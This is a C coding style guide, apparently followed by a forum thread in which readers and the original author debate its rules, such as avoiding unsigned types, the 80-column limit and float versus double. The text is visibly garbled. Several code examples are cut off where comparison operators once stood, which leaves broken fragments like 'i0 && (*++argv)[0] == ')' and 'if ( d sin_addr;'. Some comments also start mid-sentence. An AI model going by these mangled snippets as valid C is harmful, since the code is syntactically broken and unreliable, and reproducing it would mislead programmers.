bunch same types together This makes the types easier to change in future, because atomic lines are easier to edit. If you'll need to change all their types together, you should use your editor's block editing mode. I think it's alright to bunch semantically-connected struct members together, though, because struct definitions are much easier to comprehend than active code. // Fine typedef struct Color { char r, g, b; } Color; Don't be afraid of short variable names If the scope fits on a screen, and the variable is used in a lot of places, and there would be an obvious letter or two to represent it, try it out and see if it helps readability. It probably will! Be consistent in your variable names across functions Consistency helps your readers understand what's happening. Using different names for the same values in functions is suspicious, and forces your readers to reason about unimportant things. Use bool from stdbool.h whenever you have a boolean value int print_steps = 0; // Bad - is this counting steps? bool print_steps = false; // Good - intent is clear Explicitly compare values; don't rely on truthiness Explicit comparisons tell the reader what they're working with, because it's not always obvious in C, and it is always important. Are we working with counts or characters or booleans or pointers? The first thing I do when I see a variable being tested for truthiness in C is to hunt down the declaration to find its type. I really wish the programmer had just told me in the comparison. // Bad - what are these expressions actually testing for (if at all?) if ( on_fire ); return !character; something( first( xs ) ); while ( !at_work ); // Good - informative, and eliminates ambiguity if ( on_fire > 0 ); return character == NULL; something( first( xs ) != '\\0' ); while ( at_work == false ); I'll often skip this rule for boolean functions named as a predicate, like is_edible or has_client. It's still not completely obvious what the conditional is checking for, but I usually consider the visual clutter of a == true or == false to be more of a hassle than a help to readers in this situation. Use your judgement. Never change state within an expression (e.g. with assignments or ++) Readable (imperative) programs flow from top to bottom: not right to left. Unfortunately, this happens way too much in C programming. I think the habit and practice was started by The C Programming Language, and it's stuck with much of the culture ever since. It's a really bad habit, and makes it so much harder to follow what your program is doing. Never change state in an expression. trie_add( *child, ++word ); // Bad trie_add( *child, word + 1 ); // Good // Good, if you need to modify `word` word += 1; trie_add( *child, word ); // Bad if ( ( x = calc() ) == 0 ); // Good x = calc(); if ( x == 0 ); // Fine; technically an assignment within an expression a = b = c; while ( --atoms > 0 ); // Bad while ( atoms -= 1, // Good atoms > 0 ); // Fine; there's no better way, without repetition int w; while ( w = calc_width( shape ), !valid_width( w ) ) { shape = reshape( shape, w ); } Don't use multiple assignment unless the variables' values are semantically linked. If there are two variable assignments near each other that coincidentally have the same value, don't throw them into a multiple assignment just to save a line. Use the comma operator, as above, judiciously. Do without it if you can: // Bad for ( int i = 0, limit = get_limit( m ); i0 && (*++argv)[0] == ') while (c = *++argv[0]) switch (c) { ... } if (argc != 1) printf(\"Usage: find -x -n pattern\"); else while (getline(line, MAXLINE) > 0) { ... } Avoid unsigned types because the integer conversion rules are complicated CERT attempts to explain the integer conversion rules, saying: Misunderstanding integer conversion rules can lead to errors, which in turn can lead to exploitable vulnerabilities. Severity: medium, Likelihood: probable. Expert C Programming (a great book that explores the ANSI standard) also explains this in its first chapter. The takeaway is that you shouldn't declare unsigned variables just because they shouldn't be negative. If you want a larger maximum value, use a long or long long (the next size up). If your function will fail with a negative number, it will probably also fail with a large number - which is what it will get if passed a negative number. If your function will fail with a negative number, just assert that it's positive. Remember, lots of dynamic languages make do with a single integer type that can be either sign. Unsigned values offer no type safety; even with -Wall and -Wextra, GCC doesn't bat an eyelid at unsigned int x = -1;. Expert C Programming also provides an example for why you should cast all macros that will evaluate to an unsigned value. #define NELEM( xs ) ( ( sizeof xs ) / ( sizeof xs[0] ) ) int const xs[] = { 1, 2, 3, 4, 5, 6 }; int main( void ) { int const d = -1; if ( d sin_addr; // Bad &( sockaddr->sin_addr ); // Good You can and should make exceptions for commonly-seen combinations of operations. For example, skipping the operators when combining the equality and boolean operators is fine, because readers are probably used to that, and are confident of the result. // Fine return hungry == true || ( legs != NULL && fridge.empty == false ); Don't use switch, and avoid complicated conditionals The switch fall-through mechanism is error-prone, and you almost never want the cases to fall through anyway, so the vast majority of switches are longer than the if equivalent. Worse, a missing break will still compile: this tripped me up all the time when I used switch. Also, case values have to be an integral constant expression, so they can't match against another variable. This discourages extractions of logic to functions. Furthermore, any statement inside a switch can be labelled and jumped to, which fosters highly-obscure bugs if, for example, you mistype defau1t. If you need to map different constant values to behavior, like: switch ( x ) { case A: do_something_for_a( x, y, z ); break; case B: do_something_for_b( x, y, z ): break; default: error( x, y, z ); break; } // These functions might not be explicit functions (i.e. they might // just be a series of statements using some of those variables). A more explicit, testable and reusable approach is to define a function that uses ternary expressions to return a function pointer of the right type: action_fn get_x_action( x ) { return ( x == A ) ? do_something_for_a : ( x == B ) ? do_something_for_b : error; } action_fn action = get_x_action( x ); action( x, y, z ); // or just: get_x_action( x )( x, y, z ); // `action` is a terrible name and is only used as an example. You // should try to think of a more-informative name for your code. You should do a similar thing if you need to map between two sets of uncorrelated constant values, like: // Bad switch ( x ) { case A: return X; case B: return Y; case C: return Z; default: return ERR; } // Good return ( x == A ) ? X : ( x == B ) ? Y : ( x == C ) ? Z : ERR; Don't use a switch where you can just use a boolean expression: // Bad switch ( x ) { case A: case B: case C: return true; default: return false; } // Good return x == A || x == B || x == C; // Or, if the names are longer, this usually reads better: return t == JSON_TYPE_null || t == JSON_TYPE_boolean || t == JSON_TYPE_number; If you need the fall-through behavior of switch, like: switch ( x ) { case A: // A stuff, fall through to B case B: // B stuff break; default: // default stuff } The equivalent if is much more readable and it's obvious what's going to happen and why. The \"B stuff\" actually applies when x == A too, and this is explicitly declared when you use an if. if ( x == A ) { // A stuff } if ( x == A || x == B ) { // B stuff } else { // default stuff } You should only need to use switch for performance tuning (once you've done benchmarks to identify hotspots!). Otherwise, there's always a safer, shorter, more-testable, and reusable alternative. Separate functions and struct definitions with two lines If you limit yourself to a maximum of one blank line within functions, this rule provides clear visual separation of global elements. This is a habit I learned from Python's PEP8 style guide. Minimize the scope of variables If a few variables are only used in a contiguous sequence of lines, and only a single value is used after that sequence, then those first lines are a great candidate for extracting to a function. // Good: addr was only used in the first part of handle_request int accept_request( int const listenfd ) { struct sockaddr addr; return accept( listenfd, &addr, &( socklen_t ){ sizeof addr } ); } int handle_request( int const listenfd ) { int const reqfd = accept_request( listenfd ); // ... stuff not involving addr, but involving reqfd } If the body of accept_request were left in handle_request, then the addr variable will be in the scope for the remainder of the handle_request function even though it's only used for getting the reqfd. This kind of thing adds to the cognitive load of understanding a function, and should be fixed wherever possible. Another tactic to limit the exposure of variables is to break apart complex expressions into blocks, like so: // Rather than: bool trie_has( Trie const trie, char const * const string ) { Trie const * const child = Trie_child( trie, string[ 0 ] ); return string[ 0 ] == '\\0' || ( child != NULL && Trie_has( *child, string + 1 ) ); } // child is only used for the second part of the conditional, so we // can limit its exposure like so: bool trie_has( Trie const trie, char const * const string ) { if ( string[ 0 ] == '\\0' ) { return true; } else { Trie const * const child = Trie_child( trie, string[ 0 ] ); return child != NULL && Trie_has( *child, string + 1 ); } } Simple constant expressions can be easier to read than variables It can often help the readability of your code if you replace variables that are only assigned to constant expressions, with those expressions. Consider the trie_has example above - the string[ 0 ] expression is repeated twice. It would be harder to read and follow if we inserted an extra line to define a char variable. It's just another thing that the readers would have to keep in mind. Many programmers of other languages wouldn't think twice about repeating an array access. Prefer compound literals to superfluous variables This is beneficial for the same reason as minimizing the scope of variables. // Bad, if `sa` is never used again. struct sigaction sa = { .sa_handler = sigchld_handler, .sa_flags = SA_RESTART }; sigaction( SIGCHLD, &sa, NULL ); // Good sigaction( SIGCHLD, &( struct sigaction ){ .sa_handler = sigchld_handler, .sa_flags = SA_RESTART }, NULL ); // Bad int v = 1; setsockopt( fd, SOL_SOCKET, SO_REUSEADDR, &v, sizeof v ); // Good setsockopt( fd, SOL_SOCKET, SO_REUSEADDR, &( int ){ 1 }, sizeof int ); Never use or provide macros that wrap control structures like for Macros that loop over the elements of a data structure are extremely confusing, because they're extra-syntactic and readers can't know the control flow without looking up the definition. To understand your program, it's crucial that your readers can understand its control flow. Don't provide control-macros even as an option. They're universally harmful, so don't enable it. Users can define their own if they really want to. // Bad #define TRIE_EACH( TRIE, INDEX ) \\ for ( int INDEX = 0; INDEX num_states; i += 1 ) { country->states[ i ].population *= percent; } } Note the const-ness of the country argument above: this communicates that the country itself won't be modified, but a pointee (although it could also be taken to suggest that the pointer is for nullity, but the function name suggests otherwise). It also allows callers to pass in a pointer to a Country const. The other situation to use pointer arguments is if the function needs to accept NULL as a valid value (i.e. the poor man's Maybe). If so, be sure use const to signal that the pointer is not for modification, and so it can accept const arguments. // Good: `NULL` represents an empty list, and list is a pointer-to-const int list_length( List const * list ) { int length = 0; for ( ; list != NULL; list = list->next ) { length += 1; } return length; } Sticking to this rule means ditching incomplete struct types, but I don't really like them anyway. (see the \"C isn't object-oriented\" rule) Prefer to return a value rather than modifying pointers This encourages immutability, cultivates pure functions, and makes things simpler and easier to understand. It also improves safety by eliminating the possibility of a NULL argument. // Bad: unnecessary mutation (probably), and unsafe void drink_mix( Drink * const drink, Ingredient const ingr ) { assert( drink != NULL ); color_blend( &( drink->color ), ingr.color ); drink->alcohol += ingr.alcohol; } // Good: immutability rocks, pure and safe functions everywhere Drink drink_mix( Drink const drink, Ingredient const ingr ) { return ( Drink ){ .color = color_blend( drink.color, ingr.color ), .alcohol = drink.alcohol + ingr.alcohol }; } This isn't always the best way to go, but it's something you should always consider. Use structs to name functions' optional arguments struct run_server_options { char * port; int backlog; }; #define run_server( ... ) \\ run_server_( ( struct run_server_options ){ \\ /* default values */ \\ .port = \"45680\", \\ .backlog = 5, \\ __VA_ARGS__ \\ } ) int run_server_( struct run_server_options opts ) { ... } int main( void ) { return run_server( .port = \"3490\", .backlog = 10 ); } I learnt this from 21st Century C. So many C interfaces could be improved immensely if they took advantage of this technique. The importance and value of (syntactic) named arguments is all-too-often overlooked in software development. If you're not convinced, read Bret Victor's Learnable Programming. Don't use named arguments everywhere. If a function's only argument happens to be a struct, that doesn't necessarily mean it should become the named arguments for that function. A good rule of thumb is that if the struct is used outside of that function, you shouldn't hide it with a macro like above. // Good; the typecast here is informative and expected. book_new( ( Author ){ .name = \"Dennis Ritchie\" } ); Always use designated initializers in struct literals // Bad - will break if struct members are reordered, and it's not // always clear what the values represent. Fruit apple = { \"red\", \"medium\" }; // Good; future-proof and descriptive Fruit watermelon = { .color = \"green\", .size = \"large\" }; Sometimes I'll bend this rule for named arguments, by having a particular field be at the top of the struct, so that callers can call the function without having to name that single argument: run_server( \"3490\" ); run_server( .port = \"3490\", .backlog = 10 ); If you want to allow this, document it explicitly. It's then your responsibility to version your library correctly, if you change the ordering of the fields. If you're providing allocation and free functions only for a struct member, allocate memory for the whole struct If you're providing foo_alloc and foo_free functions only so you can allocate memory for a member of the Foo struct, you've lost the benefits and safety of automatic storage. You may as well have the allocation and free methods allocate memory for the whole struct, so users can pass it outside the scope it was defined (without dereferencing it), if they want. Avoid getters and setters If you're seeking encapsulation in C, you're probably overcomplicating things. Encourage your users to access and set struct members directly; never prefix members with _ to denote an access level. Declare your struct invariants, and you don't need to worry about your users breaking things - it's their responsibility to provide a valid struct. As advised in another rule, avoid mutability wherever you can. // Rather than: void city_set_state( City * const c, char const * const state ) { c->state = state; c->country = country_of_state( state ); } // Always prefer immutability and purity: City city_with_state( City c, char const * const state ) { c.state = state; c.country = country_of_state( state ); return c; } City c = { .name = \"Vancouver\" }; c = city_with_state( c, \"BC\" ); printf( \"%s is in %s, did you know?\", c.name, c.country ); But you should always provide an interface that allows for declarative programming: City const c = city_new( .name = \"Boston\", .state = \"MA\" ); printf( \"I think I'm going to %s,\" \"Where no one changes my state\", c.name, c.country ); C isn't object-oriented, and you shouldn't pretend it is C doesn't have classes, methods, inheritance, (nice) object encapsulation, or real polymorphism. Not to be rude, but: deal with it. C might be able to achieve crappy, complicated imitations of those things, but it's just not worth it. As it turns out, C already has an entirely-capable language model. In C, we define data structures, and we define functionality that uses combinations of those data structures. Data and functionality aren't intertwined in complicated contraptions, and this is a good thing. Haskell, at the forefront of language design, made the same decision to separate data and functionality. Learning Haskell is one of the best things a programmer can do to improve their technique, but I think it's especially beneficial for C programmers, because of the underlying similarities between C and Haskell. Yes, C doesn't have anonymous functions, and no, you won't be writing monads in C anytime soon. But by learning Haskell, you'll learn how to write good software without classes, without mutability, and with modularity. These qualities are very beneficial for good C programming. Embrace and appreciate what C offers, rather than attempting to graft other paradigms onto it.",

Thanks for sharing it! Suffice to say: my opinions on this topic have shifted significantly. A decade+ more of programming-in-the-large, and I no longer pay much heed to written-in-prose style guides. Instead, I've found mechanistic \"style\" enforcement and close-to-live-feedback much more effective for maintaining code quality over time. A subtext is that I wrote this during a period of work - solo programmer, small company - on a green-field power system microcontroller project; MODBUS comms, CSV data wrangling. I'd opted for C primarily for the appeal of having a codebase I could keep in my head (dependencies included!). There was much in-the-field development, debugging and redeployments, so it was really valuable to have a thin stack, and an easy build process. So, other than one vendored third-party package, I had total control over that codebase's style. And so, I had the space to consider and evolve my C programming style, reflecting on what I considered was working best for that code. My personal C code style has since shifted significantly, as well - much more towards older, more-conventional styles. Still, opinionated, idiosyncratic documents like this - if nothing else - can serve as fun discussion prompts. I'm appreciating all the discussion here! reply bjourne 3 hours agoparentUpdate the text! I would love to read the diff. reply robxorb 12 hours agoprev> Write correct, readable, simple and maintainable software, and tune it when you're done, with benchmarks to identify the choke points If speed is a primary concern, you can't tack it on at the end, it needs to be built in architecturally. Benchmarks applied after meeting goals of read/maintainability are only benchmarking the limits of that approach and focus. They can't capture the results of trying and benchmarking several different fundamental approaches made at the outset in order to best choose the initial direction. In this case \"optimisation\" is almost happening first. Sometimes the fastest approach may not be particularly maintainable, and that may be just fine if that component is not expected to require maintaining, eg, a pure C bare-metal in a bespoke and one-off embedded environment. reply eschneider 9 hours agoparentWell, yes. Architect for performance, try not to do anything \"dumb\", but save micro-optimizations for after performance measurement. reply ragnese 1 hour agorootparentThe problem with all of these rules of thumb is that they're vague to the point of being vacuously true. Of course we all agree that \"premature optimization is the root of all evil\" as Knuth once said, but the saying itself is basically a tautology: if something is \"premature\", that already means it's wrong to do it. I'll be more impressed when I see specific advice about what kinds of \"optimizations\" are premature. Or, to address your reply specifically, what counts as \"doing something dumb\" vs. what is a \"micro-optimization\". And, the truth is, you can't really answer those questions without a specific project and programming language in mind. But, what I do end up seeing across domains and programming languages is that people sacrifice efficiency (which is objective and measurable, even if \"micro\") for a vague idea of what they consider to be \"readable\" (today--ask them again in six months). What I'm specifically thinking of is people writing in programming languages with eager collection types that have `map`, `filter`, etc methods, and they'll chain four or five of them together because it's \"more readable\" than a for-loop. The difference in readability is absolutely negligible to any programmer, but they choose to make four extra heap-allocated, temporary, arrays/lists and iterate over the N elements four or five times instead of once because it looks slightly more elegant (and I agree that it does). Is it a \"micro-optimization\" to just opt for the for-loop so that I don't have to benchmark how shitty the performance is in the future when we're iterating over more elements than we thought we'd ever need to? Or is it not doing something dumb? To me, it seems ridiculous to intentionally choose a sub-optimal solution when the optimal one is just as easy to write and 99% (or more) as easy to read/understand. reply eschneider 52 minutes agorootparentOk, a bit more detail then. :) Architecting for performance means picking your data structures, data flow, and algorithms with some thought towards efficiency for the application you have in mind. Details will vary a lot depending on context. But as many folks have said, this sort of thing can't be done after the fact. As for \"doing something dumb\", I've often seem fellow engineers do things like repeatedly insert into sorted data structures in a loop instead of just inserting into an unsorted structure and then sorting after the inserts. If you think about it for just a minute, it should be obvious why that's not smart (for most cases.) Stuff like that. What do I mean by \"micro-optimizations\"? Taking a clearly written function and spending a lot of time making it as efficient _as_possible_ (possibly at the expense of clarity) without first doing some performance analysis to see if it matters. Nobody's saying to pick suboptimal solutions at all. reply vbezhenar 10 hours agoparentprevI don't know if this embedded development still alive. I'm writing firmware for nRF BLE chip which is supposed to run from battery and their SDK uses operating system. Absolutely monstrous chips with enormous RAM and Flash. Makes zero sense to optimize for anything, as long as device sleeps well. reply mark_undoio 9 hours agorootparentA little over 10 years ago I was doing some very resource-constrained embedded programming. We had been using custom chip with an 8051-compatible instruction set (plus some special purpose analogue circuitry) with a few hundred bytes of RAM. For a new project we used an ARM Cortex M0, plus some external circuitry for analogue parts. The difference was ridiculous - we were actually porting a prototype algorithm from a powerful TI device with hardware floating point. It turned out viable to simply compile the same algorithm with software emulation of floating point - the Cortex M0 could keep up. Having said all that though: the 8051 solution was so much physically smaller that the ARM just wouldn't have been viable in some products (this was more significant because having the analogue circuitry on-chip limited how small the feature size for the digital part of the silicon could be). Obviously that was quite a while ago! But even at the time, I was amazed how much difference the simpler chip made actually made to the size of the solution. The ARM would have been a total deal breaker for that first project, it would just have been too big. I could certainly believe people are still programming for applications like that where a modern CPU doesn't get a look in. reply robxorb 10 hours agorootparentprevProbably right in the broader sense, but there are still niches. Eg, for one: space deployments, where sufficiently hardened parts may lag decades behind SOTA and the environ can require a careful balance of energy/heat against run-time. reply ajross 4 hours agorootparentprevIt's still alive, but pushed down the layers. The OS kernel on top of which you sit still cares about things like interrupt entry latency, which means that stack usage analysis and inlining management has a home, etc...

It also seems like this would apply fairly well to C++ as well. One thing that I'll strongly quibble with: \"Use double rather than float, unless you have a specific reason otherwise\". As a graphics programmer, I've found that single precision will do just fine in the vast majority of cases. I've also found that it's often better to try to make my code work well in the single precision while keeping an eye out for precision loss. Then I can either rewrite my math to try to avoid the precision loss, or selectively use double precision just in the parts where its needed. I think that using double precision from the start is a big hammer that's often unneeded. And using single precision buys you double the number of floats moving through your cache and memory bandwidth compared to using double precision. reply ack_complete 11 hours agoparentI'm torn both ways on the double issue. On the one hand, doubles are much more widely supported these days, and will save you from some common scenarios. Timestamps are a particular one, where a float will often degrade on a time scale that you care about, and doubles not. A double will also hold any int value without loss (on mainstream platforms), and has enough precision to allow staying in world coordinates for 3D geometry without introducing depth buffer problems. OTOH, double precision is often just a panacea. If you don't know the precision requirements of your algorithm, how do you know that double precision will work either? Some types of errors will compound without anti-drifting protection in ways that are exponential, where the extra mantissa bits from a double will only get you a constant factor of additional time. There are also current platforms where double will land you in very significant performance problems, not just a minor hit. GPUs are a particularly fun one -- there are currently popular GPUs where double precision math runs at 1/32 the rate of single precision. reply teddyh 8 hours agorootparentI think you used the word “panacea” incorrectly.

Minor issue, but hidden behavior. reply gavinhoward 4 hours agoprevI agree with most, and most of the others I might quibble with, but accept. However, the item to not use unsigned types is vastly stupid! Signed types have far more instances of UB, and in the face of 00UB [1], that is untenable. It is correct that mixing signed and unsigned is really bad; don't do this. Instead, use unsigned types for everything, including signed math. Yes, you can simulate two's complement with unsigned types, and you can do it without UB. On my part, all of my stuff uses unsigned, and when I get a signed type from the outside, the first thing I do is convert it safely, so I don't mix the two. This does mean you have to be careful in some ways. For example, when casting a \"signed\" type to a larger \"signed\" type, you need to explicitly check the sign bit and fill the extension with that bit. And yes, you need to use functions for math, which can be ugly. But you can make them static inline in a header so that they will be inlined. The result is that my code isn't subject to 00UB nearly as much. [1]: https://gavinhoward.com/2023/08/the-scourge-of-00ub/ reply mcinglis 3 hours agoparentAuthor here, 10 years later -- I agree. I'd remove that rule wholesale in an update of this guide. Unsigned integer types can and should be used, especially for memory sizes. I would still advocate for large signed types over unsigned types for most domain-level measurements. Even if you think you \"can't\" have a negative balance or distance field, use a signed integer type so that underflows are more correct. Although validating bounds would be strictly better, in many large contexts you can't tie validation to the representation, such as across most isolation boundaries (IPC, network, ...). For example, you see signed integer types much more often in service APIs and IDLs, and I think that's usually the right call. reply gavinhoward 2 hours agorootparentI think with those changes, my disagreement would become a mere quibble. > I would still advocate for large signed types over unsigned types for most domain-level measurements. Even if you think you \"can't\" have a negative balance or distance field, use a signed integer type so that underflows are more correct.

Yeah, I'm a hard egg. reply nwellnhof 3 hours agoparentprevIn the vast majority of cases, integer overflow or truncation when casting is a bug, regardless whether it is undefined, implementation-defined or well-defined behavior. Avoiding undefined behavior doesn't buy you anything. If you start to fuzz test with UBSan and -fsanitize=integer, you will realize that the choice of integer types doesn't matter much. Unsigned types have the benefit that overflowing the left end of the allowed range (zero) has a much better chance of being detected. reply gavinhoward 3 hours agorootparent> Avoiding undefined behavior doesn't buy you anything. This is absolutely false. Say you want to check if a mathematical operation will overflow. How do you do it with signed types? Answer: you can't. The compiler will delete any form of check you make because it's UB. (There might be really clever forms that avoid UB, but I haven't found them.) The problem with UB isn't UB, it's the compiler. If the compilers didn't take advantage of UB, then you would be right, but they do, so you're wrong. However, what if you did that same check with unsigned types? The compiler has to allow it. Even more importantly, you can implement crashes on overflow if you wish, to find those bugs, and I have done so. You can also implement it so the operation returns a bit saying whether it overflowed or not. You can't do that with signed types. > If you start to fuzz test with UBSan and -fsanitize=integer, you will realize that the choice of integer types doesn't matter much. I do this, and this is exactly why I think it matters. Every time they report UB is a chance for the compiler to maliciously destroy your hard work. reply lelanthran 3 hours agorootparentprev> In the vast majority of cases, integer overflow or truncation when casting is a bug, regardless whether it is undefined, implementation-defined or well-defined behavior. Avoiding undefined behavior doesn't buy you anything. With respect, this is nonsense. With UB, the compiler might remove the line of code entirely. With overflow/underflow/truncation, the results are well-defined and the compiler is not allowed to simply remove the offending line. reply yoochan 45 minutes agoprev\"We can't get tabs right, so use spaces everywhere\" I'm more like: Always use tabs, never use space.

Then due to your hard limit you’ll invent something like “// see explained.txt:123 for explanation” or maybe “https://shrt.url/f0ob4r” it. There’s nothing wrong with breaking limits if you do that reasonably, cause most limits have edge cases. It’s (Rule -> Goal X) most of the times, but sometimes it’s (Rule -> Issue). Make it (Solution (breaks Rule) -> Goal X), not (Solution (obeys Rule) -> not (Goal X)). reply kleiba 11 hours agoparentAgree. This 80 character limit stems from a time where terminals could only display comparatively few characters in a line, a limit we haven't had in decades as screen resolutions grew. Another argument for shorters lines is that it is much harder for us to read any text when lines get too long. There's a reason why we read and write documents in portrait mode, not landscape. But in sum, I don't think there's a need for creating a hard limit at the 80 character mark. Most code is not indented more than three or four times anyways, and most if not all languages allow you to insert newlines to make long expressions wrap. However, if you occasionally do need to go longer, I think that's completely fine and certainly better than having to bend around an arcane character limit. reply f1shy 11 hours agorootparent> This 80 character limit stems from a time where terminals could only display comparatively few characters in a line, a limit we haven't had in decades as screen resolutions grew.

As the post even mentions, 100 and 120 columns have been another popular choices and thus we don't really have any de-facto standard about them! reply vbezhenar 10 hours agorootparentMy opinion is that line width depends on identifier naming style. For example Java often prefers long explicitly verbose names for class, fields, methods, variables. Another approach is to use short names as much as possible. `mkdir` instead of `create_directory`, `i` instead of `person_index` and so on. I think that max line length greatly depends on the chosen identifier naming style. So it makes sense to use 100 or 120 for Java and it makes sense to use 72 for Golang. C code often use short naming style, so 72 or 80 should be fine. reply kllrnohj 3 hours agorootparentC is the worst at naming length since everything is in the global namespace unless you're working on a teeny tiny project. So everything gets clunky prefixes to use as pseudo-namespaces or overly descriptive name to avoid conflicts. Local variables sure, be short and terse. But that's common in most languages. reply lifthrasiir 10 hours agorootparentprevAnd you risk a collision for global identifiers, which cannot be reorganized in C. If some library had the same thought and defined `mkdir` first, your code can't define `mkdir` even as a private symbol. So you have to prefix everything and that contributes to the identifier length. In comparison, Go has a much better (but personally not yet satisfactory) module system and can have a lower limit. reply wruza 9 hours agorootparentprevAlso on age, e.g. I began to prefer grandma font size from time to time for better focus, and that changes my workspace geometry. For mkdir all-in, meh. It’s okay for mkdirp or rimraf, cause these basically became new words. But once you add more libs or code to a project it becomes a cryptic mess of six-letter nonsense.

Readers of your code who rely on that standard, and have their terminal or editor sized to 80 characters wide, can fit more on the screen by placing windows side-by-side. This is one of the silliest practices to still be enforced or even considered in 2024. “Readers” should get a modern IDE/text editor and/or modern hardware. reply nanolith 5 hours agoparentOn my 4K monitor, I use 4-5 vertical splits and 2-3 horizontal splits. The 80 column rule makes each of these splits readable, and allows me to see the full context of a chunk of kernel code or firmware at once. It has nothing to do with \"modern\" hardware or \"modern\" IDEs. It has everything to do with fitting the most amount of relevant information that I can on the screen at once, in context, and properly formatted for reading. The 80 column rule may seem arbitrary, but it really helps analysis. I avoid open source code that ignores it, and I'll ding code that violates it during code review. If I had code marching off the screen, or rudely wrapped around so it violated spacing, I'd have to reduce the number of splits I used to see it, and that directly impacts my ability to see code in context. Modern IDEs don't reduce the need to see things in context. It's not a matter of organizing things in drop-down menus, smart tabs, font changes, or magic \"refactor\" commands. Verifying function contracts in most extant software -- which lacks modern tooling like model checking -- requires verifying these things by hand until these contracts can be codified by static assertions. This, in turn, requires examining function calls often 5-6 calls deep to ensure that the de facto specifications being built up don't miss assumptions made in code deep in the bowels of under-documented libraries. I'd be terribly upset if I had to try to do this in code that not only missed modern tooling but that was written by a developer who mistakenly believed that \"80 columns is for geezers.\" I freely admit that, at 43, I probably count as a \"geezer\" to many young developers. But, that doesn't change the utility of this rule. Violations of contracts in software account for a large percentage of errors in software AND security vulnerabilities. Most of these violations are subtle and easy to miss unless you can see the call stack in context. No developer can keep hundreds of details from code that they did not write in their head with perfect clarity. It's incredibly nice to have uniform style and uniform maximum line lengths. By convention, 80 columns has shown itself to be the most stable of these limits.

GCC has been around for decades, it is a safe bet. reply 0xTJ 7 hours agoparentEven when I'm writing a toy operating system, or other toy projects, I personally always try to use the standard options like -std=c11 (though don't have anything against people who use the dialect option). I'm happy to use compiler extensions, but I'll use __asm__ instead of asm, and use __extension__ as needed. I've done some neat but truly upsetting things with compiler extensions in my hobby code, especially once I combine them with macros. I'm particularly \"proud\" of the mutex macros in a toy OS of mine, which wrap a statement inside for loops and switch statements for automatic release of the mutex, unless it's requested that it stay locked. There, I originally used compiler extensions to release the mutex on scope exit, but switched to non-compiler-extension code for the actual functions, and just using the extensions for checking that the code using the macros didn't break the \"contracts\" on what is allowed in those statements, and how they can be exited. It's the same reason that I'm always explicit about the size of integers, using stdint, even if I know that an int is 32-bit on a particular platform. reply diath 7 hours agoparentprevPersonally I do, the Windows builds for my game use a Windows VM with MSVC, the Linux builds use GCC for certain optimizations, and for the dev builds I use Clang for sanitizers. Sure, you mention \"a toy project\" but he's talking about trying to avoid non-standard extensions in general, which is a fair point. reply astrobe_ 6 hours agoparentprevThe recommendation of using the most recent standard is very slightly inconsistent with this, because in rare cases your code could be reused in weird embedded targets that only have an unmaintained proprietary C compiler. That was already rare in 2014 I think. Still, the situation might arise, just like you can still can find AS/400 machines or Cobol in production. reply stef-13013 9 hours agoprevVery interesting.

That makes a good point to start the discussion regardless of my own opinion. Thus I'll contribute back by giving my own judgement for every single item here: Absolute agreement * Always develop and compile with all warnings (and more) on * #include the definition of everything you use * Provide include guards for all headers to prevent double inclusion * Always comment `#endif`s of large conditional sections * Declare variables as late as possible * Be consistent in your variable names across functions * Minimize the scope of variables * Use `assert` everywhere your program would fail otherwise * Repeat `assert` calls; don't `&&` them together * C isn't object-oriented, and you shouldn't pretend it is Strong agreement with some obvious exceptions * Use `//` comments everywhere, never `/* ... */` * Comment non-standard-library `#include`s to say what symbols you use from them * No global or static variables if you can help it (you probably can) * Minimize what you expose; declare top-level names static where you can * Use `double` rather than `float`, unless you have a specific reason otherwise * Avoid non-pure or non-trivial function calls in expressions * Simple constant expressions can be easier to read than variables * Initialize strings as arrays, and use sizeof for byte size * Where possible, use `sizeof` on the variable; not the type * Document your struct invariants, and provide invariant checkers * Avoid `void *` because it harms type safety * If you have a `void *`, assign it to a typed variable as soon as possible * Only use pointers in structs for nullity, dynamic arrays or incomplete types * Avoid getters and setters Agreed but you need a few more words * Don't be afraid of short variable names [if the scope fits on a screen] * Explicitly compare values; don't rely on truthiness [unless values themselves are boolean] * Use parentheses for expressions where the operator precedence isn't obvious [but `&foo->bar` *is* obvious] * Separate functions and struct definitions with two lines [can use comments instead] * If a macro is specific to a function, `#define` it in the body [and `#undef` ASAP] * Only typedef structs; never basic types or pointers [or make them distinct enough, but ISO C stole a `_t` suffix] I do so or I see why but that's really a problem of C and its ecosystem instead * Use GCC's and Clang's `-M` to automatically generate object file dependencies * Avoid unified headers * Immutability saves lives: use `const` everywhere you can * Use `bool` from `stdbool.h` whenever you have a boolean value * Avoid unsigned types because the integer conversion rules are complicated * Prefer compound literals to superfluous variables * Never use array syntax for function arguments definitions * Don't use variable-length arrays * Use C11's anonymous structs and unions rather mutually-exclusive fields * Give structs TitleCase names, and typedef them * Never begin names with `_` or end them with `_t`: they're reserved for standards * Only use pointer arguments for nullity, arrays or modifications * Prefer to return a value rather than modifying pointers * Always use designated initializers in struct literals I do so but am not sure * Write to the most modern standard you can [we have no choice for many cases] * Program in American English [only applicable for native speakers] I see why but I think you are mislead * Don't write argument names in function prototypes if they just repeat the type [such case is very, very rare] * Use `+= 1` and `-= 1` over `++` and `--` [`++`/`--` should be read as succ/pred and should be exclusively used for pointers] * Don't use `switch`, and avoid complicated conditionals [switch is okay once you have enabled enough warnings] * Only upper-case a macro if will act differently than a function call [agreed in principle, but should define \"differently\" more broadly] * Always prefer array indexing over pointer arithmetic [and then you will be biten by index variable types, remember `ptrdiff_t`] That's really just a personal preference * We can't get tabs right, so use spaces everywhere [as long as mechanically enforcable, the choice itself is irrelevant] * Always put `const` on the right and read types right-to-left [too eyesore] * Use one line per variable definition; don't bunch same types together [will agree with some significant exceptions though] * Never change state within an expression (e.g. with assignments or `++`) [absolutely avoid functions, but `++` has its uses] * Always use brackets, even for single-statement block [rather a read-write trade-off; this may make some codes harder to read] * Never use or provide macros that wrap control structures like `for` [the example is very tame in comparison to actually problematic macros] * Don't typecast unless you have to (you probably don't) [while many typecasts can be easily removed, excess doesn't do actual harm] * Give enums `UPPERCASE_SNAKE` names, and lowercase their values [I would rather avoid enums for various reasons] * Use structs to name functions' optional arguments [maybe the author tried to say \"avoid too many arguments\" instead?] * If you're providing allocation and free functions only for a struct member, allocate memory for the whole struct [that complicates using struct as a value] Just no. * Never have more than 79 characters per line [100 or 120 do work equally well, you do need some limit though] * Define a constant for the size of every enum [would imply that all enum values are sequential, and that's not true!] reply janice1999 5 hours agoparent> * No global or static variables if you can help it (you probably can) I can't imagine doing this on embedded systems. reply lifthrasiir 5 hours agorootparentThat's what I meant by \"some obvious exceptions\" :-) reply jstimpfle 7 hours agoparentprev> * We can't get tabs right, 